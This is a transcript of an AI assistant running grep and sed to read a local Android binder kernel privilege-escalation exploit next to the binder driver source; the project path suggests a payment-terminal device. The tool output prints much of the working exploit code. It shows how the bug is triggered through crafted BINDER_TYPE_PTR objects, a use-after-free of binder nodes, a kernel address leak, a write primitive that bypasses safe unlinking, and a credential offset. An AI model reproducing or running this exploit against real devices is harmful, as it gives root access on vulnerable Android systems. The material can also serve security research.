[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"binder_dec_node_nilocked\\|list_empty\\|hlist_del\\|kfree(node)\\|BUG_ON\" kern_ref/414_binder.c | sed -n '1,40p'"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"data\\[\\|data+\\|kaddr\" bfs_ref/lpe/src/node.c | sed -n '1,60p'"}

[tool • bash]
767:static bool binder_worklist_empty_ilocked(struct list_head *list)
769:	return list_empty(list);
773: * binder_worklist_empty() - Check if no items on the work list
779:static bool binder_worklist_empty(struct binder_proc *proc,
785:	ret = binder_worklist_empty_ilocked(list);
794:	BUG_ON(target_list == NULL);
795:	BUG_ON(work->entry.next && !list_empty(&work->entry));
930:	return !binder_worklist_empty_ilocked(&thread->todo) ||
933:		 !binder_worklist_empty_ilocked(&thread->proc->todo));
950:		binder_worklist_empty_ilocked(&thread->todo) &&
1189:	kfree(node);
1223:		if (!node->has_weak_ref && list_empty(&node->work.entry)) {
1247:static bool binder_dec_node_nilocked(struct binder_node *node,
1266:				!hlist_empty(&node->refs))
1271:		if (list_empty(&node->work.entry)) {
1276:		if (hlist_empty(&node->refs) && !node->local_strong_refs &&
1285:				BUG_ON(!list_empty(&node->work.entry));
1295:				hlist_del(&node->dead_node);
1312:	free_node = binder_dec_node_nilocked(node, strong, internal);
1370:	BUG_ON(node->tmp_refs < 0);
1379:	free_node = binder_dec_node_nilocked(node, 0, 1);
1511:		binder_dec_node_nilocked(ref->node, 1, 1);
1513:	hlist_del(&ref->node_entry);
1514:	delete_node = binder_dec_node_nilocked(ref->node, 0, 1);
1777:	BUG_ON(!target_thread);
1779:	BUG_ON(target_thread->transaction_stack != t);
1780:	BUG_ON(target_thread->transaction_stack->from != target_thread);
1883:		BUG_ON(from != t->from);
1905:	BUG_ON(t->flags & TF_ONE_WAY);
2544:	BUG_ON(!node);
2547:		BUG_ON(thread);
2572:		BUG_ON(target_list != &node->async_todo);
3080:		BUG_ON(t->buffer->async_transaction != 0);
3087:		BUG_ON(t->buffer->async_transaction != 0);
3100:		BUG_ON(target_node == NULL);
3101:		BUG_ON(t->buffer->async_transaction != 1);
3177:	BUG_ON(thread->return_error.cmd != BR_OK);
3333:			free_node = binder_dec_node_nilocked(node,
3389:				BUG_ON(!buf_node->has_async_transaction);
3390:				BUG_ON(buf_node->proc != proc);


[tool • bash]
317:bool node_kaddr_disclose(struct exp_node *node1, struct exp_node *node2)
336:   /* Looks good, let's disclose the respective kaddrs. */
341:      node1->kaddr = a1 - 0x58;
342:      node2->kaddr = b0 - 0x58;
344:      node2->kaddr = a0 - 0x58;
345:      node1->kaddr = b1 - 0x58;
444:   uint8_t data[0x80];
475:   /* Do we know the node kaddr yet? */
476:   if (!node->kaddr) {
482:       * dummy and node kaddr.
484:      node_kaddr_disclose(dummy, node);
487:   /* update the kaddr values to bypass safe unlinking. */
488:   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
489:   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
495:      while (!node_kaddr_disclose(dummy, node)) {
500:      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
501:      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '1247,1300p' kern_ref/414_binder.c"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '440,505p' bfs_ref/lpe/src/node.c"}

[tool • bash]
static bool binder_dec_node_nilocked(struct binder_node *node,
				     int strong, int internal)
{
	struct binder_proc *proc = node->proc;

	assert_spin_locked(&node->lock);
	if (proc)
		assert_spin_locked(&proc->inner_lock);
	if (strong) {
		if (internal)
			node->internal_strong_refs--;
		else
			node->local_strong_refs--;
		if (node->local_strong_refs || node->internal_strong_refs)
			return false;
	} else {
		if (!internal)
			node->local_weak_refs--;
		if (node->local_weak_refs || node->tmp_refs ||
				!hlist_empty(&node->refs))
			return false;
	}

	if (proc && (node->has_strong_ref || node->has_weak_ref)) {
		if (list_empty(&node->work.entry)) {
			binder_enqueue_work_ilocked(&node->work, &proc->todo);
			binder_wakeup_proc_ilocked(proc);
		}
	} else {
		if (hlist_empty(&node->refs) && !node->local_strong_refs &&
		    !node->local_weak_refs && !node->tmp_refs) {
			if (proc) {
				binder_dequeue_work_ilocked(&node->work);
				rb_erase(&node->rb_node, &proc->nodes);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "refless node %d deleted\n",
					     node->debug_id);
			} else {
				BUG_ON(!list_empty(&node->work.entry));
				spin_lock(&binder_dead_nodes_lock);
				/*
				 * tmp_refs could have changed so
				 * check it again
				 */
				if (node->tmp_refs) {
					spin_unlock(&binder_dead_nodes_lock);
					return false;
				}
				hlist_del(&node->dead_node);
				spin_unlock(&binder_dead_nodes_lock);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "dead node %d deleted\n",
					     node->debug_id);
			}


[tool • bash]
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where)
{
   struct exp_node *dummy = NULL;
   int pfd[2];
   uint8_t data[0x80];

   if (!node)
      return false;

   if (node->idx == node->num_pending)
      return false;

   memset(data, 0, 0x80);

   *(uint64_t *)(data + 0x20) = what;
   *(uint64_t *)(data + 0x28) = where;
   *(uint64_t *)(data + 0x30) = 0; 
   *(uint64_t *)(data + 0x38) = 0; /* proc == NULL */
   *(uint64_t *)(data + 0x40) = 0; /* No refs. */
   *(uint32_t *)(data + 0x48) = 0; /* Internal strong refs. */
   *(uint32_t *)(data + 0x4c) = 0; /* local_weak_refs  == 0.  */
   *(uint32_t *)(data + 0x50) = 1; /* local strong refs. */
   *(uint32_t *)(data + 0x54) = 0; /* tmp_refs == 0. */
   *(uint64_t *)(data + 0x58) = 0x4444444444444444; /* Used by node_realloc_content to verify replacement */
   *(uint64_t *)(data + 0x68) = 0; /* has_strong_refs == 0 &&  has_weak_refs == 0 */

   /* Create dummy node. */
   dummy = node_new("dummy");
   pipe(pfd);

   /* Overlay an epitem. */
   while (!node_realloc_epitem(dummy, pfd[0]))
         node_reset(dummy);


   /* Do we know the node kaddr yet? */
   if (!node->kaddr) {
      /* Drop the current epitem. */
      node_free_epitem(node);


      /* Use the previous'dummy' node to disclose both
       * dummy and node kaddr.
       */
      node_kaddr_disclose(dummy, node);
   }

   /* update the kaddr values to bypass safe unlinking. */
   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;

   log_info("[*] Reallocating content of '%s' with controlled data.", node->name);
   while (!node_realloc_content(node, data, 0x80)) {
      log_info(".");
      node_reset(node);
      while (!node_kaddr_disclose(dummy, node)) {
         node_reset(node);
      }

      /* Update values. */
      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
   }

   if (dummy) {
      node_free(dummy);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '/^struct epitem {/,/^};/p' kern_ref/fs_eventpoll.c 2>/dev/null || sed -n '/^struct epitem {/,/^};/p' kern_ref/eventpoll.c 2>/dev/null; ls kern_ref/"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '/^struct binder_node {/,/^};/p' kern_ref/414_binder.c && echo ======REF && sed -n '/^struct binder_ref {/,/^};/p' kern_ref/414_binder.c"}

[tool • bash]
414_binder_alloc.c
414_binder.c
414_binder.h
414_eventpoll.c
5x_binder.c
aosp414.c


[tool • bash]
struct binder_node {
	int debug_id;
	spinlock_t lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		 * bitfield elements protected by
		 * proc inner_lock
		 */
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		 * invariant after initialization
		 */
		u8 accept_fds:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};
======REF
struct binder_ref {
	/* Lookups needed: */
	/*   node + proc => ref (transaction) */
	/*   desc + proc => ref (transaction, inc/dec ref) */
	/*   node => refs + procs (proc exit) */
	struct binder_ref_data data;
	struct rb_node rb_node_desc;
	struct rb_node rb_node_node;
	struct hlist_node node_entry;
	struct binder_proc *proc;
	struct binder_node *node;
	struct binder_ref_death *death;
};


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"node_kfree\\|pending_node_free\\|terminate_endpoint\\|endpoint_free\\|node_reset\\|node_free\\b\" bfs_ref/lpe/src/node.c bfs_ref/lpe/src/exploit.c | head -30"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"def binder_dec_node\\b\\|def dec_node\\|proc\\b.*NULL\\|node->proc\" bfs_ref/lpe/src/exploit.c | head; echo ====; sed -n '/^static void dec_node/,/^}/p' bfs_ref/lpe/src/exploit.c | head -60"}

[tool • bash]
bfs_ref/lpe/src/node.c:121:static void _node_free(struct exp_node *node, bool reset)
bfs_ref/lpe/src/node.c:142:      terminate_endpoint(node->name);
bfs_ref/lpe/src/node.c:145:      terminate_endpoint(node->name);
bfs_ref/lpe/src/node.c:156:void node_free(struct exp_node *node)
bfs_ref/lpe/src/node.c:158:   _node_free(node, false);
bfs_ref/lpe/src/node.c:164:bool node_reset(struct exp_node *node)
bfs_ref/lpe/src/node.c:170:   _node_free(node, true);
bfs_ref/lpe/src/node.c:183:void node_kfree(struct exp_node *node)
bfs_ref/lpe/src/node.c:188:   pending_node_free(node->bs, node->handle, node->vma_start, node->num_pending + 1, 1, node->second);
bfs_ref/lpe/src/node.c:284:   node_kfree(node);
bfs_ref/lpe/src/node.c:334:      node_reset(node2);
bfs_ref/lpe/src/node.c:411:      node_kfree(node);
bfs_ref/lpe/src/node.c:472:         node_reset(dummy);
bfs_ref/lpe/src/node.c:494:      node_reset(node);
bfs_ref/lpe/src/node.c:496:         node_reset(node);
bfs_ref/lpe/src/node.c:505:      node_free(dummy);
bfs_ref/lpe/src/exploit.c:549:      node_reset(file);
bfs_ref/lpe/src/exploit.c:558:      node_reset(epitem_node);
bfs_ref/lpe/src/exploit.c:777:   node_free(file);
bfs_ref/lpe/src/exploit.c:778:   node_free(epitem_node);
bfs_ref/lpe/src/exploit.c:779:   node_free(write8_selinux);
bfs_ref/lpe/src/exploit.c:780:   node_free(write8_inode);
bfs_ref/lpe/src/exploit.c:781:   node_free(write8_sysctl);


[tool • bash]
====


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"dec_node\\|pending_node_free\" bfs_ref/lpe/src/node.c | head; echo ====; sed -n '/^void pending_node_free/,/^}/p' bfs_ref/lpe/src/pending_node.c"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -rn \"dec_node\" bfs_ref/lpe/src/pending_node.c bfs_ref/lpe/src/endpoint.c | head; echo ===; grep -n \"binder_dec_node\\|dec(nil\\|dec(\" bfs_ref/lpe/src/endpoint.c bfs_ref/lpe/src/binder.c | head -20"}

[tool • bash]
188:   pending_node_free(node->bs, node->handle, node->vma_start, node->num_pending + 1, 1, node->second);
====
void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}


[tool • bash]
bfs_ref/lpe/src/pending_node.c:322:		dec_node(bs, node, vma_start, true, second);
bfs_ref/lpe/src/pending_node.c:325:		dec_node(bs, node, vma_start, false, second);
bfs_ref/lpe/src/pending_node.c:331: * `binder_dec_node()` function with (hopefully) controlled
===


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"static.*dec_node\\|^void dec_node\" bfs_ref/lpe/src/*.c; echo ===; awk '/^(static )?void dec_node/,/^}/' bfs_ref/lpe/src/pending_node.c"}

[tool • bash]
bfs_ref/lpe/src/exploit.c:62:void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
===


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '40,230p' bfs_ref/lpe/src/exploit.c"}

[tool • bash]
#define REAL_CRED_OFFSET 0x838

char pathname[64];


uint64_t reserved_buffer_sz = 0;
uint64_t memstart_addr = 0;
uint64_t kernel_base = 0;

/*
 * Convert physical address to kernel virtual address.
 */

uint64_t phys_to_virt(uint64_t phys)
{
   return (phys - memstart_addr) | 0xFFFFFFC000000000;
}

/*
 * Trigger the bug, and free pending node, on which we still have
 * a reference. This will be the primitive for all the exploitation.
 */
void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
{

   struct binder_transaction_data_sg sg;
   struct binder_transaction_data *td;
   struct binder_write_read bwr;

   uint64_t handle = 0; /* It *SHOULD* be 0 as it's the value from ref created from the ctx mgr node. */

   /* Send a big buffer. */

   uint32_t tr_size = reserved_buffer_sz; // Use a query size of 0x20000 (we subtract 0x10 for the secctx)
   uint8_t data[BINDER_BUFFER_SZ];
   uint64_t offsets[128];
   uint8_t sg_buf[0x1000];
   uint32_t readbuf[32];
   uint8_t *ptr = data;
   uint64_t *offs = offsets;
   uint8_t buf[0x100];
   uint32_t buflen = 0;


   /*
   * Used to perform BC_TRANSACTION_SG queries.
   */
   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;

   *(uint64_t *)(data + 0xe8) = 0x40; // offset of valid BINDER_TYPE_PTR
   /* The purpose of this apparently useless transaction is to initialize the content of the qword at
   * offset 0xf0 from the beginning of the transaction buffer of the servicemanager.
   * I used a transaction size of 0x20000 to be sure to retrieve the whole buffer for myself, and this way 
   * be sure to be serviced the very beginning of the transaction buffer.
   */
   // the transaction won't make it through as it will fail trying to copy from a NULL userland pointer
   binder_transaction(bs, false, target, data, tr_size, NULL, 1); 


   /* Wait for the BR_FAILED_REPLY. */
   uint32_t remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_FAILED_REPLY);

   memset(buf, 0, 0x100);
   memset(offsets, 0, 128 * sizeof(uint64_t));

   /* From here it gets a little bit messy / crafty. */

   /*
   * Create the first object valid object, which will be smashed after the bug has been successfully triggered.
   */
   struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
   fbo->hdr.type = strong ? BINDER_TYPE_HANDLE : BINDER_TYPE_WEAK_HANDLE;
   fbo->flags = 0;
   fbo->handle = target;
   fbo->cookie = 0;
   *(offs++) = ((uint8_t *)fbo) - data;
   ptr = ++fbo;


   /*
   * Here, we craft a BINDER_TYPE_PTR, which won't be added to the offset array, and will thus not be validated by the binder
   * driver. It will be used later, once the bug is triggered, and we can make the `parent` pointer, point to this object.
   * As it wasn't validated we can't assign it an arbitrary length. The sole purpose of this object is to use the
   * binder parent fixup code to overwrite a qword at an "arbitrary" offset with the userland address of a child buffer.
   * This is the primitive which is used to overwrite the handle value of the BINDER_TYPE_HANDLE we created above.
   */
   struct binder_buffer_object *bbo = (struct binder_buffer_object *)(ptr);         //For now, we assume the fd will be 4
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = vma_start; /* This *MUST* be the address of the beginning of the userland mapping of /dev/binder. */
   bbo->length = 0xdeadbeefbadc0ded;
   bbo->parent = 0;
   bbo->parent_offset = 0;
   ptr = ++bbo;

   /* This one is the official one. */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = sg_buf;
   bbo->length = 0x10;
   bbo->parent = 0;
   bbo->parent_offset = 0;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* We create an additionnal BINDER_TYPE_PTR, whose parent will be the one we created just above. This is where the bug is triggered,
   * as the bbo->parent index is set to 6 which is wrong as it is > to the number of offsets in the offsets array. offs[6] will thus end up pointing in
   * not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 
   * value 0x40, which is the offset of the previous BINDER_TYPE_PTR object in order for the `binder_validate_ptr` and `binder_valid_fixup` function to succeed.
   * This BINDER_TYPE_PTR is then eventually validated and the `last_fixup_obj_off` is set to the offset of this object.
   * This implies that we just validated a BINDER_TYPE_PTR whose bbo->parent index points into an array entry which will be modified by the next BINDER_TYPE_PTR below,
   * that the driver will process.
   */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = NULL;
   bbo->length = 0;
   bbo->parent = 6;
   bbo->parent_offset = 0;
   buflen += bbo->length;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* 
   * And finally, the last nail in the coffin.
   * We craft the almost exact same BINDER_TYPE_PTR as above, still having a parent index of 6. This time however, we specific a 'buffer', whose data will be copied from
   * before validating the BINDER_TYPE_PTR. This qword will overwrite the value at offs[6], replacing the value 0x40 pointing to a validated BINDER_TYPE_PTR, with the value 0x18,
   * which points to the very first BINDER_TYPE_PTR, which wasn't validated by the binder driver as we haven't added it's offset to the offsets array. The following will now happen
   * in `binder_fixup_parent()`:
   * ```c
   2884         parent = binder_validate_ptr(target_proc, b, &object, bp->parent,
   2885                                      off_start_offset, &parent_offset,
   2886                                      num_valid);
   ...
   2893         if (!binder_validate_fixup(target_proc, b, off_start_offset,
   2894                                    parent_offset, bp->parent_offset,
   2895                                    last_fixup_obj_off,
   2896                                    last_fixup_min_off)) {
   2897                 binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
   2898                                   proc->pid, thread->pid);
   2899                 return -EINVAL;
   2900         }
   * ```
   * Here, parent will now point to the unvalidated BINDER_TYPE_PTR, however, to be used by the driver it needs to be validated by the `binder_validate_fixup()` function:
   * ```c
   * 2414 static bool binder_validate_fixup(struct binder_proc *proc,
   2415                                   struct binder_buffer *b,
   2416                                   binder_size_t objects_start_offset,
   2417                                   binder_size_t buffer_obj_offset,
   2418                                   binder_size_t fixup_offset,
   2419                                   binder_size_t last_obj_offset,
   2420                                   binder_size_t last_min_offset)
   2421 {
   ...
   2427         while (last_obj_offset != buffer_obj_offset) {
   2428                 unsigned long buffer_offset;
   2429                 struct binder_object last_object;
   2430                 struct binder_buffer_object *last_bbo;
   2431                 size_t object_size = binder_get_object(proc, b, last_obj_offset,
   2432                                                        &last_object);
   2433                 if (object_size != sizeof(*last_bbo))
   2434                         return false;
   2435
   2436                 last_bbo = &last_object.bbo;
   2437                 *
   2438                 * Safe to retrieve the parent of last_obj, since it
   2439                 * was already previously verified by the driver.
   2440                 *
   2441                 if ((last_bbo->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
   2442                         return false;
   2443                 last_min_offset = last_bbo->parent_offset + sizeof(uintptr_t);
   2444                 buffer_offset = objects_start_offset +
   2445                         sizeof(binder_size_t) * last_bbo->parent,
   2446                 binder_alloc_copy_from_buffer(&proc->alloc, &last_obj_offset,
   2447                                               b, buffer_offset,
   2448                                               sizeof(last_obj_offset));
   2449         }
   2450         return (fixup_offset >= last_min_offset);
   2451 }
   ```
   Here, as the `last_bbo` pointer was previously validated by the driver, it is trusted, and it particular, its `parent` field is trusted. However, the value of
   last_bbo->parent is now `0x18` instead of `0x40`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '230,320p' bfs_ref/lpe/src/exploit.c"}

[tool • bash]
   last_bbo->parent is now `0x18` instead of `0x40`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the
   fake BINDER_TYPE_PTR), and exists the loop. From now on, the driver will be manipulating and unvalidated object. The following code will try to fixup the buffer address
   in the fake BINDER_TYPE_PTR object:
   ```c
   2909         buffer_offset = bp->parent_offset +
   2910                         (uintptr_t)parent->buffer - (uintptr_t)b->user_data;
   2911         binder_alloc_copy_to_buffer(&target_proc->alloc, b, buffer_offset,
   2912                                     &bp->buffer, sizeof(bp->buffer));
   ```
   As the parent->buffer is equal to b->user_data, only the parent_offset which is 8, is taken into account. This means that the userland address of the
   bp->buffer will be copied at the offset 8 from the beginning of the binder buffer, which happens to be the offset of the node value of the BINDER_TYPE_HANDLE 
   (which has meanwhile been transformed into a BINDER_TYPE_BINDER by the binder driver) object we added at the beginning of the transaction. When eventually entering
   the binder_transaction_buffer_release() function, the driver will fail trying to decrement the invalid node.
   */
   uint64_t new_off = 0x18;
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = &new_off;
   bbo->length = sizeof(new_off);
   bbo->parent = 0x6; // offs[6] = 0x18;
   bbo->parent_offset = 0x8 + ((second == true) ? 4 : 0);
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* Send the BC_TRANSACTION_SG transaction. */
   writebuf.cmd = BC_TRANSACTION_SG;
   //writebuf.txn.target.handle = 0; // Ctxt mgr
   writebuf.txn.target.handle = target; // endpoint
   writebuf.txn.code = TRIGGER_DECREF;
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = ((uint8_t*)ptr) - ((uint8_t *)data);
   writebuf.txn.offsets_size = ((uint8_t*)offs) - ((uint8_t *)offsets);
   writebuf.txn.data.ptr.buffer = data;
   writebuf.txn.data.ptr.offsets = offsets;
   buflen = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;
   writebuf.buffers_size = buflen;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send bogus query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

   /* Wait for the reply and free. */
   remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_REPLY);

   /* Free the transaction buffer. */
   td = (struct binder_transaction_data *)(data + consumed - sizeof(*td));
   /* Free buffer. */
   binder_free_buffer(bs, td->data.ptr.buffer);
}


/*
 * Do all the preparation for the exploitation, that is setup up a number of pending nodes
 * on the soon to be dangling `binder_node`. I used multiple pending nodes as I need to leak values
 * multiple times in order to disclose the kernel address of the dangling `binder_node`, and know
 * where I add controlled kernel data in order to bypass PAN.
 */
uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2)
{
	struct binder_transaction_data *tr;
	uint8_t txn_data[BINDER_BUFFER_SZ];
	uint8_t rdata[512];
	uint64_t uaf_node = 0, uaf_node2 = 0;
	uint32_t remaining = 0, consumed = 0;
	struct binder_transaction_data *t = (struct binder_transaction_data *)(rdata + sizeof(uint32_t));

	struct binder_io msg, reply;

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	
	/* Compute the reserved buffer size, and ask the endpoint to reserve it. */


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '320,420p' bfs_ref/lpe/src/exploit.c"}

[tool • bash]
	/* Compute the reserved buffer size, and ask the endpoint to reserve it. */
	reserved_buffer_sz = RESERVED_BUFFER_SZ - (n1 + n2) * 0x10;
	make_transaction(rdata, false, endpoint_handle, txn_data, reserved_buffer_sz, NULL, 0);
	t->code = RESERVE_BUFFER;
	/* Make the call. */
	binder_write(bs, rdata, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the BR_TRANSACTION_COMPLETE. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);
	/* Free the transaction. */
	tr = ((uint8_t*)rdata + consumed - sizeof(*tr));
	binder_free_buffer(bs, tr->data.ptr.buffer);

	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Retrieve the vma_start address of the endpoint. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, GET_VMA_START) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	uint64_t vma_start = bio_get_uint32(&reply) + (((uint64_t)bio_get_uint32(&reply)) << 32);
	binder_free_buffer(bs, reply.data0);

	/* Now, we exchange handle, so as to create the vulnerable node, and for the endpoint
	 * to be able to reach back to us.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	bio_put_obj(&msg, 0x4141); //Add arbitrary node value
	if (binder_call(bs, &msg, &reply, endpoint_handle, EXCHANGE_HANDLES) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	/* The endpoint should have created a ref to the uaf node. */
	uaf_node = bio_get_ref(&reply);
	if (!uaf_node) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node);

	uaf_node2 = bio_get_ref(&reply);
	if (!uaf_node2) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node2);


	/* Free the buffer. */
	binder_free_buffer(bs, reply.data0);

	int i;
	pthread_t node_th;

	for (i = 0; i < n1; i++) {
		/* Create the first pending node. */
		node_th = pending_node_create(bs, uaf_node);

		if (th)
			th[i] = node_th;
	}

	int j;
	for (j = 0; j < n2; j++) {
		node_th = pending_node_create(bs, uaf_node2);
		if (th)
			th[i + j] = node_th;
	}

	/* Now that we have a pending node, we can release our reference to it. */
	binder_release(bs, uaf_node);
	binder_release(bs, uaf_node2);

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	/* return the vulnerable node reference to the caller. */
	return vma_start;
}

/*


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '1,120p' bfs_ref/lpe/src/pending_node.c"}

[tool • bash]
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <sys/syscall.h>

#include "log.h"
#include "binder.h"
#include "endpoint.h"
#include "pending_node.h"

static struct pending_node *pending_nodes = NULL;
static uint64_t last_node_th = 0;

static struct pending_node *pending_node_new(void)
{
	struct pending_node *node = NULL;

	node = malloc(sizeof(*node));
	if (!node) {
		log_err("malloc: %s\n", strerror(errno));
		return NULL;
	}

	memset(node, 0, sizeof(*node));

	if (pthread_barrier_init(&node->barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->ready, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->do_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->done_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}


	/* Insert in front. */
	node->next = pending_nodes;
	pending_nodes = node;

	return node;
}

static struct pending_node *pending_node_get(pthread_t node_th)
{
	struct pending_node *tmp = pending_nodes;

	while (tmp) {
		if (tmp->uaf_node_th == node_th)
			return tmp;
		tmp = tmp->next;
	}

	return NULL;
}

/*
 * This thread keep a reference to the freed binder_node, which allows leaking a qword at offset 0x58
 * and 0x60 of an object in the kmalloc-128 slab, as well a trigerring a controlled write8
 */
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
